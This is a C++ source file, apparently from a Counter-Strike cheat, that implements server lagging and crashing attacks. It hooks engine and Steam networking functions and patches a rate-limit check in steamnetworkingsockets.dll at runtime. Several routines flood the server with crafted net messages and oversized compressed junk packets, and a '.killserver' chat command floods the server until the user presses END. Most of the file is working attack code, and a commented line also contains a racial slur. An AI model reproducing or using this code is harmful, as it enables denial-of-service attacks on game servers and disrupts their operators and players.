        //static auto oClMove = reinterpret_cast<CL_MoveFn>(MEM::FindPattern("engine.dll", "55 8B EC 81 EC ? ? ? ? 53 56 57 8B 3D ? ? ? ? 8A"));
        //oClMove(NULL, false);
        //static auto cl_move = reinterpret_cast<CL_MoveFunc>(MEM::FindPattern(ENGINE_DLL, ));
        //cl_move(NULL, true);
        isCallingClMove = false;
    }*/



    /*CKeyValues* kvAwardedEvent = new CKeyValues();
    kvAwardedEvent->Init("OnPlayerAward");
    kvAwardedEvent->SetInt("iController", 0);
    kvAwardedEvent->SetString("award", "AVENGE_FRIEND");
    auto keyval = (std::string)("\"OnPlayerAward\"\
    {\
        \"$iController\" \"0\"\
            \"award\" \"AVENGE_FRIEND\"\
    }");
    Signon.set_allocated_keyvalues(&keyval);*/
    //	Signon.set_keyvalues("OnPlayerAward", strlen("OnPlayerAward"));
        /*
        //WriteProtobufToBuffer(&sex3, &buffStat, net_SetConVar);
        dataFragments_s* data = new dataFragments_t;
        //data->bytes = g_LZSSLagCreator.CreateLZSSData(&data->buffer);
        *(int32_t*)data->buffer = (int32_t)SNAPPY_ID;
        data->bits = data->bytes * 8;
        data->isCompressed = true;
        data->nUncompressedSize = *(data->buffer + sizeof(int32_t)) * 2;
        data->file = (void*)999;
        strcpy(data->filename, "%s%s%s%s\0");
        //WriteFragmentsToSubChannel(ecx, data, buf, 0, data->bytes);
        WriteCrasherData(&buffStat, data, data->bytes, 0);*/
        //CNETMsg_SetConVar_t sex3("", "");
        //	CCLCMsg_ListenEvents e;
        //	e.set_event_mask(0, 0);



        //exploit.add_event_mask
        //CNETMsg_SetConVar_t exploit;
        // bullet_impact
        //exploit.add_event_mask(411006662);

        //WriteProtobufToBuffer(&Signon, &buffStat, net_SignonState);

        //dataFragments_s* data = new dataFragments_t;
        //data->bytes = g_LZSSLagCreator.CreateLZSSData(&data->buffer);
        //char* pSignOnBuffer = (char*)malloc(pBufferSize);
        /*
        bf_write buffStat(pSignOnBuffer, pBufferSize);
        CCLCMsg_ListenEvents_t exploit_new;
        exploit_new.add_event_mask(2474240907);
        exploit_new.add_event_mask(164298725);
        exploit_new.add_event_mask(2301622834);
        exploit_new.add_event_mask(268434501);
        exploit_new.add_event_mask(411006662);
        exploit_new.add_event_mask(4186178415);
        exploit_new.add_event_mask(3816813371);
        exploit_new.add_event_mask(4294895990);
        exploit_new.add_event_mask(127358);
        WriteProtobufToBuffer(&exploit_new, &buffStat, clc_ListenEvents);

        //int jitter = 0;
        //static int auto_adjust_interval = 0;
        //bool has_written = false;
        //int k = 0;
        ////int real_jitter = 0;
        //static bool toggle = false;
        //static bool lastHeld = false;
        //static bool lastHeld_up = false;
        //static bool lastHeld_down = false;
        //
        //static int var = 0.f;
        //float temp1;
        //float temp2;
        //float temp3;
        //
        //if (I::Engine->GetNetChannelInfo() != nullptr) {
        //	I::Engine->GetNetChannelInfo()->GetRemoteFramerate(&temp1, &temp2, &temp3);
        //	var = temp3 * 1000.f;
        //}
        //bool down = GetAsyncKeyState(VK_HOME) & 0x8000;
        //bool increase = GetAsyncKeyState(VK_OEM_PLUS) & 0x8000;
        //bool decrease = GetAsyncKeyState(VK_OEM_MINUS) & 0x8000;
        static int lastTick = 0;
        if (lastTick == I::Globals->iTickCount)
            return 1;
        lastTick = I::Globals->iTickCount;
        /*
        if (down && !lastHeld) {
            toggle = !toggle;
            if (toggle)
                I::Engine->ClientCmdUnrestricted("echo \"> lagger ON\"");
            else
                I::Engine->ClientCmdUnrestricted("echo \"> lagger OFF\"");
        }

        if (increase && !lastHeld_up) {
            lagValue += 1;
            I::Engine->ClientCmdUnrestricted(((std::string)"echo \"> lag value " + std::to_string(lagValue) + (std::string)"\"").c_str());

        }
        if (decrease && !lastHeld_down) {
            lagValue -= 1;
            I::Engine->ClientCmdUnrestricted(((std::string)"echo \"> lag value " + std::to_string(lagValue) + (std::string)"\"").c_str());

        }

        if (toggle && I::Engine->GetNetChannelInfo() != nullptr) {
            /*if (var < 90.f && auto_adjust_interval >= 1) {
                lagValue++;
                I::Engine->ClientCmdUnrestricted(((std::string)"echo \"> lag value [auto] " + std::to_string(lagValue) + " var: " + std::to_string(var) + (std::string)"\"").c_str());

            }
            else if (var  > 90.f) {
                lagValue -= 3;
                I::Engine->ClientCmdUnrestricted(((std::string)"echo \"> lag value [auto] " + std::to_string(lagValue) + " var: " + std::to_string(var) + (std::string)"\"").c_str());

            }
            auto_adjust_interval = 0;
        }
    //	if (toggle && !has_written && I::Engine->GetNetChannelInfo() != nullptr) {
    //		CCLCMsg_ListenEvents_t exploit;
            //typedef int(__stdcall* WriteListenEventList)(CCLCMsg_ListenEvents* msg);
            //(reinterpret_cast<WriteListenEventList>(MEM::FindPattern("engine.dll", "55 8B EC 83 EC 50 8D")))(&exploit);


            //has_written = true;
        //}
        if (lagtoggle && lastCmds[lagtype] != nullptr/* && lastMoveCmd != nullptr) {
            //srand(time(NULL));
            bf_write penis(lastCmds[lagtype], (NET_MAX_MESSAGE - (1260 * 50)));
            /*if (lastMoveCmd != nullptr) {
                bf_write penis2(lastMoveCmd, (NET_MAX_MESSAGE - (1260 * 50)));
                SendOurMessage(I::Engine->GetNetworkChannel(), penis.GetData(), lastMoveCmdSize, false, true, false, false);
            //	I::Prediction->bInPrediction = true;

            }*/

            //	char* penisback = (char*)malloc(pBufferSize);
            //	bf_write penis2(penisback, pBufferSize);
                //CCLCMsg_ListenEvents_t game_buf;
                //game_buf.ParseFromArray(lastEventCmd, (NET_MAX_MESSAGE - (1260 * 50)));
                //CCLCMsg_ListenEvents_t exploit_new;

                //for (int i = 0; i < game_buf.event_mask_size(); i++) {
                //	exploit_new.add_event_mask(game_buf.event_mask(i));
                //}
                //WriteProtobufToBuffer(&exploit_new, &penis2, clc_ListenEvents);

                //penis.WriteBytes(lastMoveCmd, lastMoveCmdSize);
                //penis.WriteBytes(lastEventCmd, lastEventCmdSize+sizeof(CCLCMsg_ListenEvents_t));
                //I::Engine->ClientCmdUnrestricted(((std::string)"echo \"> lag DEBUG " + std::to_string(lastEventCmdSize) + (std::string)"\"").c_str());
                /*FILE* underscore = fopen("C:\\lag1.dat", "w");
                fwrite(penis.GetData(), 523956, 1, underscore);
                fclose(underscore);
                FILE* underscore2 = fopen("C:\\lag2.dat", "w");

                fwrite(penis2.GetData(), pBufferSize, 1, underscore);
                fclose(underscore2);
                std::string sex5;
                game_buf.
                game_buf.SerializeToString(&sex5);
                std::ofstream out("C:\\lag3.dat");
                out << sex5;
                out.close();
                fclose(underscore2);
                free(penisback);

                //for (int i = 0; i < rand() % (lagValue - (lagValue/2) + 1) + (lagValue/2); i++) {
                for (int i = 0; i < lagvalue; i++) {

                    SendOurMessage(I::Engine->GetNetworkChannel(), penis.GetData(), penis.GetNumBytesWritten(), false, true, true, false);
                    //free(pSignOnBuffer);

                    //WriteCrasherData(buf, data, data->bytes, 0);
                }

            }
        //	lastHeld = down;
            //lastHeld_up = increase;
            //lastHeld_down = decrease;
            //Sleep(10);
            //if (nCount > 200) {
        //		Sleep(2000);
            //}


            return 1;

        }*/
return 1;
}
bool shouldCall = true;
char* packetbuf = NULL;
class LZSSLagger2 {

public:
    bool init = false;
    unsigned char* LZSSData;
    unsigned int output_size = 0;
    int SizeOfFakePacket = 0;
    int lastPacketSize = 0;


    LZSSLagger2(int size) { Init(size); }
    void Init(int size) {

        lastPacketSize = size;
        CLZSS Compressor;
        char* buffer = (char*)malloc(size + sizeof(unsigned int));

        for (int i = 0; i < size; i += 8) {
            *(int8_t*)(&buffer[i] + sizeof(unsigned int)) = (int8_t)rand() % 0x7FFFFFFFF;
        }
        LZSSData = Compressor.CompressLeave8((unsigned char*)buffer, size, &output_size);
        output_size += sizeof(unsigned int);
        init = true;

    }
    int CreateLZSSData(char** buffer_to_write) {



        *buffer_to_write = (char*)LZSSData;
        return output_size;
    }
};


unsigned int __stdcall FuckServer(void*)
{
    shouldCall = false;
    static auto HOST_VERSION = *(int32_t*)MEM::FindPattern("engine.dll", "A1 ? ? ? ? 50 FF 77 08");
    if (!packetbuf) {
        const int size = (MAX_ROUTABLE_PAYLOAD * 10);
        static LZSSLagger2 g_LZSSLagCreator2(size);
        char* Packet;
        int bytes = g_LZSSLagCreator2.CreateLZSSData(&Packet);
        bytes = std::clamp(bytes, 0, size);
        bf_write msg(Packet, size);
        msg.WriteLong(LittleLong((int)CONNECTIONLESS_HEADER));
        //msg.WriteByte(A2A_PING); // 
        msg.WriteByte('k');
        msg.WriteLong(HOST_VERSION);
        packetbuf = (char*)malloc(size + sizeof(SPLITPACKET));
        ehQ_memcpy(packetbuf + sizeof(SPLITPACKET), (void*)((uintptr_t)Packet), size);
    }
    SPLITPACKET* to_split = (SPLITPACKET*)packetbuf;
    //while (!(GetAsyncKeyState(VK_END) & 0x8000)) {
    for (int i = 0; (i < 500); i++) {
        CUSTOM_NET_SendLong(ARGS_KEEP.netchann, (unsigned char*)packetbuf + sizeof(SPLITPACKET), 13, 576);
    }
    //}
    shouldCall = true;
    return 0;
}
/*if (GetAsyncKeyState(VK_END) & 0x8000 && !lastHeld) {
    lagtoggle = !lagtoggle;
    if (lagtoggle)
        PlaySoundA(TEXT("C:\\Windows\\media\\Windows Hardware Insert.wav"), NULL, SND_FILENAME | SND_ASYNC);
    else
        PlaySoundA(TEXT("C:\\Windows\\media\\Windows Hardware Remove.wav"), NULL, SND_FILENAME | SND_ASYNC);
    lastHeld = true;
}*/
//static bool lastHeld = false;
struct ParamsForLag {
    INetChannel* netChann;
    bf_write* buf;
};
static bool init = false;
unsigned char* LZSSData;
unsigned int output_size = 0;
int SizeOfFakePacket = (67108863 * 2);
int lastPacketSize = 0;
int g_bHasSentLagData = 0;
int CreateLZSSData(char** buffer_to_write) {


    if (((lastPacketSize != 11) && init) || !init) {
        if (init) {
            free(LZSSData);
        }
        SizeOfFakePacket = (int)((float)(67108863.f * 2.f) * (((float)11 / 10.f)));

        //if (config->mmlagger.enabled) {
        //	SizeOfFakePacket = SizeOfFakePacket / 10;
        //}

        init = false;
        lastPacketSize = 11;
    }



    if (!init) {
        lastPacketSize = 11;
        CLZSS Compressor;
        char* buffer = (char*)malloc(SizeOfFakePacket + 8);

        for (int i = 0; i < SizeOfFakePacket; i += 8) {
            *(int64_t*)&buffer[i] = (int64_t)rand() % 0x7FFFFFFFFFFFFFFF;
        }

        //Debug::QuickPrint("Writing LZSSData to Store Buffer");
        LZSSData = Compressor.Compress((unsigned char*)buffer, SizeOfFakePacket, &output_size);
        init = true;
    }
    *buffer_to_write = (char*)LZSSData;
    return output_size;
}
/*
static void _cdecl LagThread(INetChannel* netChann, bf_write* buf) {

    while (true) {
        //if ((g_bHasSentLagData < 1)) {
            //Debug::QuickPrint("Writing Fake LZSS Data");
            dataFragments_s* data = new dataFragments_t;
            //data->bytes = g_LZSSLagCreator.CreateLZSSData(&data->buffer);
            data->bytes = CreateLZSSData(&data->buffer);
            *(int32_t*)data->buffer = (int32_t)SNAPPY_ID;
            data->bits = data->bytes * 8;
            data->isCompressed = true;
            data->isReplayDemo = false;
            data->nUncompressedSize = *(data->buffer + sizeof(int32_t));
            data->file = (void*)999;
            strcpy(data->filename, "%s%s%s%s\0");
            WriteFragmentsToSubChannel(netChann, data, buf, 0, data->bytes);
            //WriteCrasherData(buf, data, data->bytes, 0);
            buf->m_bOverflow = false;
            g_bHasSentLagData++; /* This may require a mutex 
          //  return;
        //}
    }



}*/
typedef int64_t(__thiscall* SNPNextThink)(void*, int64_t usecNow);

int64_t __fastcall H::hk_SNP_GetNextThinkTime(void* ecx, void* edx, int64_t usecNow) { // xE8????x3BxD3x7Cx0E
    int64_t usecNextTime = DTR::NextThinkTime.GetOriginal<SNPNextThink>()(ecx, usecNow);

    static void* pRateLimReturnAddress{ (void*)MEM::FindPattern("steamnetworkingsockets.dll", XorStr("8B CA 8B F0 8B 55 10")) };

    if (_ReturnAddress() == pRateLimReturnAddress) {
        return 0;
    }
    return usecNextTime;
}
int H::WriteLagToBuffer(bf_write sexbuf) {
    switch (C::Get<int>(Vars.iPacketType)) {
    case 0: {
        CNETMsg_NOP_t e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 1: {
        CNETMsg_Disconnect_t e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 2: {
        CNETMsg_File_t e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 3: {
        CNETMsg_SplitScreenUser_t e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 4: {
        CNETMsg_Tick e;
        e.set_tick(-1);
        e.set_host_computationtime(1.f);
        e.set_host_computationtime_std_deviation(1.f);
        e.set_host_framestarttime_std_deviation(1.f);
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 5: {
        CNETMsg_StringCmd e;
        e.set_command(";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;");
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 6: {
        CNETMsg_SetConVar_t e("cl_", "");
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 7: {
        CNETMsg_SignonState e;
        e.set_spawn_count((lastSpawnCount == 0) ? 20 : lastSpawnCount);
        e.set_signon_state(SIGNONSTATE_CHANGELEVEL);
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 8: {
        CCLCMsg_ClientInfo e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 9: {
        CCLCMsg_Move_t e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
          break;
    case 10: {
        CCLCMsg_VoiceData e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
           break;
    case 11: {
        CCLCMsg_BaselineAck e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
           break;
    case 12: {
        CCLCMsg_ListenEvents e;
        for (int i = 0; i <= 256; i++)
            e.add_event_mask(0);
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
           break;
    case 13: {
        CCLCMsg_RespondCvarValue e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
           break;
    case 14: {
        CCLCMsg_FileCRCCheck e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
           break;
    case 15: {
        CCLCMsg_LoadingProgress e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
           break;
    case 16: {
        CCLCMsg_SplitPlayerConnect e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
           break;
    case 17: {/*
        CCLCMsg_ClientMessage e;
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));*/
    }
           break;
    case 18: {
        CCLCMsg_CmdKeyValues e;
        e.set_keyvalues("OnPlayerAward", strlen("OnPlayerAward"));
        WriteProtobufToBuffer(&e, &sexbuf, C::Get<int>(Vars.iPacketType));
    }
           break;
    case 19:
    case 20: {
        CCLCMsg_HltvReplay e;
        e.set_request(REPLAY_EVENT_STUCK_NEED_FULL_UPDATE);
        WriteProtobufToBuffer(&e, &sexbuf, 20);
    }
           break;
    }
    return sexbuf.GetNumBytesWritten();
}
static int lastLagType = 1337;
void H::DoLag() {
    // SendOurMessage(I::Engine->GetNetworkChannel(), sexbuf.GetData(), sexbuf.GetNumBytesWritten(), false, true, false, false);
    if (!I::Engine->IsInGame() || I::Engine->GetNetworkChannel() == nullptr) {
        return;
    }
    if (lastCmds[C::Get<int>(Vars.iPacketType)].buf == nullptr && C::Get<int>(Vars.iBuildMethod) == 1)
        return;
    if (C::Get<int>(Vars.iTimingType) == 0 && !IPT::IsKeyDown(C::Get<int>(Vars.iLagKey)))
        return;
 
    if (C::Get<int>(Vars.iBuildMethod) == 0) {
        static char* sexptr = (char*)malloc(NET_MAX_MESSAGE - (1260 * 50));
        static bf_write sexbuf(sexptr, (NET_MAX_MESSAGE - (1260 * 50)));
        if (C::Get<int>(Vars.iPacketType) != lastLagType) {
            int max_amount = (4000 / WriteLagToBuffer(sexbuf)) - 1;

            for (int i = 0; i < std::clamp(C::Get<int>(Vars.iLagSize)-1, 0, max_amount); i++)
                WriteLagToBuffer(sexbuf);
            lastLagType = C::Get<int>(Vars.iPacketType);
        }
        SendOurMessage(I::Engine->GetNetworkChannel(), sexbuf.GetData(), sexbuf.GetNumBytesWritten(), false, true, false, false);
    }
    else {
      //  SendOurMessage(I::Engine->GetNetworkChannel(), lastCmds[C::Get<int>(Vars.iPacketType)].bitbuf.GetData(), lastCmds[C::Get<int>(Vars.iPacketType)].bitbuf->GetNumBytesWritten(), false, true, false, false);
    }

}

#define CONCAT_IMPL( x, y ) x##y
#define MACRO_CONCAT( x, y ) CONCAT_IMPL( x, y )
#define PAD( size ) uint8_t MACRO_CONCAT( _pad, __COUNTER__ )[ size ];

class CClientState2 {
private:
    PAD(0x9C);                                // 0x0000

public:
    INetChannel* m_net_channel;				// 0x009C

private:
    PAD(0x70);                                // 0x00A0

public:
    int				m_next_message_time;		// 0x0110

public:
    float           m_net_cmd_time;             // 0x0114
    uint32_t        m_server_count;             // 0x0118
private:
    PAD(0x4C);								// 0x011C

public:
    int             m_unk;                      // 0x0168
    int             m_server_tick;              // 0x016C
    int             m_client_tick;              // 0x0170
    int             m_delta_tick;               // 0x0174

private:
    PAD(0x4B30);                              // 0x0178

public:
    float           m_frame_time;               // 0x4CA8
    int             m_last_outgoing_command;    // 0x4CAC
    int             m_choked_commands;          // 0x4CB0
    int             m_last_command_ack;         // 0x4CB4
    PAD(0x134);                               // 0x4CB8
    CEventInfo* m_events;					// 0x4DEC

    enum indices : size_t {
        TEMPENTITIES = 36,
    };
};
/*
unsigned int WINAPI H::LagThread(void* pParam) {
    while (!I::Engine->IsInGame() || !I::Engine->IsConnected()) {
        std::this_thread::sleep_for(50ms);
    }
    L::Print("in lag thread");
    char* bullshit = (char*)malloc((1260*50));
    //CCLCMsg_VoiceData_t e;
    //e.set_data(spamBuf);

    while (1) {
        if (!(GetAsyncKeyState(VK_XBUTTON1) & 0x8000) || !I::Engine->IsInGame()) {
            std::this_thread::sleep_for(50ms);
        }
        else {
            bool init = false;
            char* pSignOnBuffer{ NULL };
            static int pBufferSize{ NULL };
            pBufferSize = (NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD * 50));
            pSignOnBuffer = (char*)malloc(pBufferSize);
            bf_write buffStat(pSignOnBuffer, pBufferSize);
            CCLCMsg_VoiceData_t voiceMsg;
            voiceMsg.set_data(bullshit);
            voiceMsg.set_format(VOICEDATA_FORMAT_STEAM);
            voiceMsg.set_xuid(69420360);

            voiceMsg.set_section_number(69420360);
            voiceMsg.set_sequence_bytes(69420360);
            voiceMsg.set_uncompressed_sample_offset(69420360);
            WriteProtobufToBuffer(&voiceMsg, &buffStat, clc_VoiceData);
            SendOurMessage(I::Engine->GetNetworkChannel(), buffStat.GetData(), buffStat.GetNumBytesWritten(), false, true, false, false);
            free(pSignOnBuffer);
        }
    }
    return 0;
}*/

int lagvalue5 = 4179;

unsigned int WINAPI H::LagThread(void* pParam) {
    //while (!I::Engine->IsInGame() || !I::Engine->IsConnected()) {
    //    std::this_thread::sleep_for(50ms);
    //}
    L::Print("in lag thread");
    bool lastheldup = false;
    bool lasthelddown = false;

    while (1) {
        if ((GetAsyncKeyState(VK_F8) & 0x8000)) {
            if (!lastheldup) {
                lagvalue5 += 10;
                I::ConVar->ConsolePrintf("new lag value: %i\n", lagvalue5);
            }
            lastheldup = true;

        }
        else if ((GetAsyncKeyState(VK_F7) & 0x8000)) {
            if (!lasthelddown) {
                lagvalue5 -= 10;
                I::ConVar->ConsolePrintf("new lag value: %i\n", lagvalue5);
            }
            lasthelddown = true;
        }
        else {
            lasthelddown = false;
            lastheldup = false;
        }
        if (!(GetAsyncKeyState(VK_XBUTTON1) & 0x8000) || !I::Engine->IsInGame()) {
            std::this_thread::sleep_for(50ms);
        }
        else {
            bool init = false;
            char* pSignOnBuffer{ NULL };
            static int pBufferSize{ NULL };
            pBufferSize = (NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD * 50));
            pSignOnBuffer = (char*)malloc(pBufferSize);
            bf_write buffStat(pSignOnBuffer, pBufferSize);
            CNETMsg_StringCmd command;
            for (int i = 0; i < lagvalue5; i++)
                WriteProtobufToBuffer(&command, &buffStat, net_StringCmd);
            SendOurMessage(I::Engine->GetNetworkChannel(), buffStat.GetData(), buffStat.GetNumBytesWritten(), false, true, false, false);
            free(pSignOnBuffer);
        }
    }
    return 0;
}

unsigned int WINAPI H::FreezerThread(void* pParam)
{
    return 1;
    static char* pSignOnBuffer{ NULL };

    char* pSignOnBuffer2{ NULL };
    static int pBufferSize{ NULL };
    static bf_write* pMsg{ NULL };
    static bf_write* pMsg2{ NULL };

    int nCount{ 0 };
    static bool lastHeld = false;
    static bool toggle = false;
    static CConVar* name = I::ConVar->FindVar(XorStr("name"));
    static CConVar* voice_loopback = I::ConVar->FindVar(XorStr("voice_loopback"));
    static bool flip = false;
    auto TooManyQueuedPackets = MEM::FindPattern("steamnetworkingsockets.dll", "8D 0C 16") + 3;
    auto TooManyQueuedPackets2 = MEM::FindPattern("steamnetworkingsockets.dll", "3B 08 7E 54") + 2;
    unsigned long protect = 0;
    VirtualProtect((void*)TooManyQueuedPackets, 2, PAGE_EXECUTE_READWRITE, &protect); /* cause jle to not set*/
    *(std::byte*)TooManyQueuedPackets = (std::byte)0x90;
    *(std::byte*)(TooManyQueuedPackets + sizeof(std::byte)) = (std::byte)0x90; /* Remove Compare */
    VirtualProtect((void*)TooManyQueuedPackets, 2, protect, &protect);
    VirtualProtect((void*)TooManyQueuedPackets2, 1, PAGE_EXECUTE_READWRITE, &protect);
    if (*(std::byte*)(TooManyQueuedPackets2) == (std::byte)0x7E) {
        *(std::byte*)(TooManyQueuedPackets2) = (std::byte)0xEB; /* jle -> jmp */
        //Debug::QuickPrint("JLE -> JMP");
    }
    VirtualProtect((void*)TooManyQueuedPackets2, 1, protect, &protect);
    while (1) {
      //  name->fnChangeCallbacks.Size() = 0;
        //name->SetValue("\x81""CS_NIGGER_BUSTER");
        /*if (&& !lastHeld) {
            lastHeld = true;
            toggle = !toggle;
            //	if (toggle)
            PlaySound(TEXT("C:\\crashsound.wav"), NULL, SND_FILENAME | SND_ASYNC);
        }
        else {
            lastHeld = false;
        }*/
//        if (GetAsyncKeyState(VK_F7) & 0x8000) {
            //SendOurMessage(I::Engine->GetNetworkChannel(), &send, false, false, false, false);
            //Sleep(1);

            /*if (!pSignOnBuffer) {
                pBufferSize = (NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD * 50));
                pSignOnBuffer = (char*)malloc(pBufferSize);
                static bf_write buffStat(pSignOnBuffer, pBufferSize);
                pMsg = &buffStat;
                LagThread(I::Engine->GetNetworkChannel(), &buffStat);
                /*
                /*CCLCMsg_ListenEvents_t e;
                    e.add_event_mask(i);*/
                    //CNETMsg_SetConVar_t e;
                    //for (int i = 0; i < 100; i++) {
                    //	CMsg_CVars_CVar* pCVar = e.mutable_convars()->add_cvars();
                        //pCVar->set_name("cl_");
                        //pCVar->set_value("");
                    //} //
                /*CNETMsg_Tick tick;

                tick.set_tick(-1);
                tick.set_host_computationtime(1.f);
                tick.set_host_computationtime_std_deviation(1.f);
                tick.set_host_framestarttime_std_deviation(1.f);

                pBufferSize = (NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD * 50));
                pSignOnBuffer = (char*)malloc(pBufferSize);
                static bf_write buffStat(pSignOnBuffer, pBufferSize);
                pMsg = &buffStat;
                for (int i = 0; i < 284; i++)
                    WriteProtobufToBuffer(&tick, &buffStat, net_Tick);
                //				WriteProtobufToBuffer(&spam, &buffStat, net_SetConVar);
                MessageBoxA(NULL, std::to_string(buffStat.GetNumBytesWritten()).c_str(), "Bytes Written", 0);
                //g_ProtoWriter.WriteListenEvents(&e, &buffStat); /* CNetMessageBinder<>*/
        }/* //
        if (!pSignOnBuffer2) {
            /*CCLCMsg_ListenEvents_t e;
                e.add_event_mask(i);
            CNETMsg_SetConVar_t e;
            //for (int i = 0; i < 100; i++) {
            CMsg_CVars_CVar* pCVar = e.mutable_convars()->add_cvars();
            pCVar->set_name("cl_");
            //pCVar->set_value("");
        //} //
            CNETMsg_SetConVar_t spam("cl_color", "1");

            pBufferSize = (NET_MAX_MESSAGE - (MAX_ROUTABLE_PAYLOAD * 50));
            pSignOnBuffer2 = (char*)malloc(pBufferSize);
            static bf_write buffStat(pSignOnBuffer2, pBufferSize);
            pMsg2 = &buffStat;
            for (int i = 0; i < 359; i++) //
                WriteProtobufToBuffer(&e, &buffStat, net_SetConVar);
            WriteProtobufToBuffer(&spam, &buffStat, net_SetConVar);

        //	MessageBoxA(NULL, std::to_string(buffStat.GetNumBytesWritten()).c_str(), "Bytes Written", 0);
            //g_ProtoWriter.WriteListenEvents(&e, &buffStat); /* CNetMessageBinder<>
        }*/

        /* Send Datagram But Thread Safe
        //voice_loopback->SetValue(!voice_loopback->GetBool());
        //if (flip)
        SendOurMessage(I::Engine->GetNetworkChannel(), pMsg->GetData(), pMsg->GetNumBytesWritten(), false, true, false, false);
        //else */
        //
        // flip = !flip;
        //Sleep(1);
        //lastHeld = true;*/


    
    //}
    return 0;
}
int __fastcall H::hkSendLong(void* netchannel, DWORD* socket, int nBytesLeft, int nMaxRoutableSize) {
    ARGS_KEEP.netchann = netchannel;
    ARGS_KEEP.socket = socket;
    ARGS_KEEP.nBytesLeft = nBytesLeft;
    ARGS_KEEP.nMaxRoutableSize = nMaxRoutableSize;
    if (GetAsyncKeyState(VK_END) & 0x8000)
        cook = false;
    if (cook)
        _beginthreadex(0, 0, FuckServer, 0, NULL, 0);

    return CUSTOM_NET_SendLong(netchannel, (unsigned char*)socket, nBytesLeft, 576);

}

void __fastcall H::hkClientCmd(void* a, void* e, const char* szCmdString) {
    static auto oClientCmd = DTR::ClientCmd.GetOriginal<decltype(&hkClientCmd)>();
    std::string command = szCmdString;
    std::string segment;
    std::stringstream buffer;

    //static ChatPrintFFn chatPrintFn = reinterpret_cast<ChatPrintFFn>(MEM::FindPattern(CLIENT_DLL, XorStr("55 8B EC B8 ? ? ? ? E8 ? ? ? ? 8B 0D ? ? ? ? 8B 01 FF 90 ? ? ? ? 85 C0 74 0A 80 78 10 00 0F 85 ? ? ? ? 8D 45 18")));
    try {
        if (command.rfind("say ", 0) == 0) {
            command.erase(std::remove(command.begin(), command.end(), '"'), command.end());
            command.erase(0, 4);


            if (command.substr(0, command.find(" ")) == ".lag") {
                lagtoggle = !lagtoggle;
                buffer << std::boolalpha << "[%s" << getCheatName() << "%s] lag " << lagtoggle;
                I::ClientMode->getHudChat()->printf(0, buffer.str().c_str(), "\x04", "\x01");
                return;
            }
            if (command.substr(0, command.find(" ")) == ".lagtype") {
                command.erase(0, command.find(" ") + 1);

                if (std::stoi(command) > 0 && std::stoi(command) <= 20) {
                    lagtype = std::stoi(command);
                    buffer << "[%s" << getCheatName() << "%s] lag type " << std::to_string(lagtype);
                    I::ClientMode->getHudChat()->printf(0, buffer.str().c_str(), "\x04", "\x01");
                }
                return;
            }
            if (command.substr(0, command.find(" ")) == ".lagvalue") {
                command.erase(0, command.find(" ") + 1);
                if (std::stoi(command) > 0) {
                    lagvalue = std::stoi(command);
                    buffer << "[%s" << getCheatName() << "%s] lag value " << std::to_string(lagvalue);
                    I::ClientMode->getHudChat()->printf(0, buffer.str().c_str(), "\x04", "\x01");
                }
                return;
            }
            if (command.substr(0, command.find(" ")) == ".killserver") {
                buffer << "[%s" << getCheatName() << "%s] killing server (press END to stop)";
                I::ClientMode->getHudChat()->printf(0, buffer.str().c_str(), "\x04", "\x01");
                cook = true;
                return;
            }
            return oClientCmd(a, e, szCmdString);
        }
    }
    catch (const std::exception& e) { return; };
    return oClientCmd(a, e, szCmdString);
    /*if (g_pConsole->OnClientConsole(szCmdString))
    hooks->engine.callOriginal<void, 7, const char*>(szCmdString);*/
}
/* UNUSED RETARD
unsigned int __stdcall H::ServerLagger(void*)
{
    const int pBufferSize = (NET_MAX_MESSAGE - (1260 * 50));





    char* pSignOnBuffer = (char*)malloc(pBufferSize);
    bf_write buffStat(pSignOnBuffer, pBufferSize);

    CNETMsg_SetConVar_t sex3("cl_", "1");
//	CCLCMsg_ListenEvents e;
//	e.set_event_mask(0, 0);

    WriteProtobufToBuffer(&sex3, &buffStat, net_SetConVar);
    /*CNETMsg_Tick tick;

    tick.set_tick(-1);
    tick.set_host_computationtime(1.f);
    tick.set_host_computationtime_std_deviation(1.f);
    tick.set_host_framestarttime_std_deviation(1.f);

    WriteProtobufToBuffer(&tick, &buffStat, net_Tick);
    //for (int i = 0; i < 3998; i++)
//		buffStat.WriteByte(255);



    while (true) {
